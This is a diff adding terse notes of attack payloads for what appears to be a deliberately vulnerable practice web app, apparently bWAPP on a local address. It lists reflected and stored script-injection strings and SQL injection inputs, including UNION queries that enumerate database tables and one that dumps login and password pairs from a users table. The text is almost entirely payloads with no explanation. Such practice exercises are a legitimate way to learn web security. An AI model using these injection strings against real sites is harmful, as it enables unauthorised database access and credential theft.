@@ -1,0 +1,26 @@
+1. HTML injection - Reflected (GET)
+ -low : 
++ <script> alert("lam")</script>   
++ lam
+2. HTML injection - Reflected (POST)
+ -low : 
++ <script> alert("lam")</script>   
++ lam
+
+3. HTML Injection - Stored (Blog)
+ -low : 
++ <script> alert("lam")</script>   
+
+4. SQL Injection (GET SEARCH)
+ -low : 
++ lam' or 1=1 #
++ lam' union select 1,user(),3,4,5,6,7 #
++ lam' union select 1,user(), database(),4,5,6,7 #
++ lam ' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #
++ lam' UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #
+5. SQL Injection (GET SELECT)
+ -low : 
++ http://192.168.10.10:80/sqli_2.php?movie=2&action=go’ or 1=1
++ http://192.168.10.10:80/sqli_2.php?movie=2’ or 1=1&action=go 
++ http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, 2,3,4,5,6,7 #&action=go
++ http://192.168.10.10:80/sqli_2.php?movie= 100 union select 1, (SELECT GROUP_CONCAT(table_name, '---') FROM information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #&action=go
